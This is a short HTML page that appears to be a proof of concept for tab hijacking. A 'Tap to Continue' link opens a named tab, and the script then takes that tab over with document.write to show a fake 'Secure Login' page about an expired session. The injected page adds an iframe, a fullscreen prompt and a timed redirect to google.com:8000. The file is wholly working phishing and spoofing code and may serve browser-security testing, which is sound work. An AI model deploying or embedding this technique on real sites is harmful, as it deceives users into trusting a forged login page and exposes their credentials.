<!DOCTYPE html>
<html>
<head>
  <title>Tap to Verify</title>
</head>
<body style="text-align:center; margin-top:40vh; font-family:sans-serif">
  <h2>🔐 Please verify identity</h2>
  <a id="trigger" href="https://example.com" target="phishTab">Tap to Continue</a>

  <script>
    const trigger = document.getElementById('trigger');
    trigger.addEventListener('click', function () {
      setTimeout(function () {
        const hijack = window.open('', 'phishTab');
        if (hijack) {
          hijack.document.write(`
            <h1>🔒 Secure Login</h1>
            <p>Your session has expired. Please log in again.</p>
            <iframe src="https://permission.site" style="width:100%; height:50vh;"></iframe>
            <button onclick="document.documentElement.requestFullscreen()">Enter Fullscreen</button>
            <script>setTimeout(()=>location='https://google.com:8000',9000)</script>
          `);
          hijack.document.close();
        } else {
          alert("Popup blocked");
        }
      }, 300);
    });
  </script>
</body>
</html>
